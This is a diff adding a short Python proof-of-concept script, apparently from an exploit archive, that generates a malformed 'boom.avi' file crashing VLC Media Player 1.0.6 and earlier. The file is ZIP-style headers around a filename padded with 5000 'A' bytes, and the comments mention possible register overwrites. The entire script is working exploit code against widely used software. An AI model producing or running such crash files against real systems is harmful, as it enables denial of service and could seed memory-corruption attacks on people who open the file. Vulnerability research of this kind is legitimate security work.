@@ -1,0 +1,35 @@
+#!/usr/bin/python
+
+######################################################################################################
+#
+# VLC Media Player <=1.0.6 Malformed Media File Crash PoC
+# Found By: Dr_IDE
+# Tested:   Windows 7, Ubuntu 9, OSX 10.6.X
+# Download: http://www.videolan.org
+# Notes:	Register overwrites seem very unpredictable at best...
+# Greets:	Offsec and Corelan Teams
+#
+######################################################################################################
+ 
+ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
+ 
+cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
+"\x00\x00\x00\x00\x00")
+ 
+eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
+"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
+ 
+filename = "VLC_Doesnt_Like_Videos_That_Are_Really_Zip_Files.AVI"
+ 
+exploit = filename
+exploit += "\x41" * 5000
+ 
+print "[+] Writing file"
+
+file = open('boom.avi','w'); #Anything here works, mpg, mp4, asf, mov etc...
+file.write(ldf_header + exploit + cdf_header + exploit + eofcdf_header);
+file.close()
+
+print "[+] Exploit file created!!"
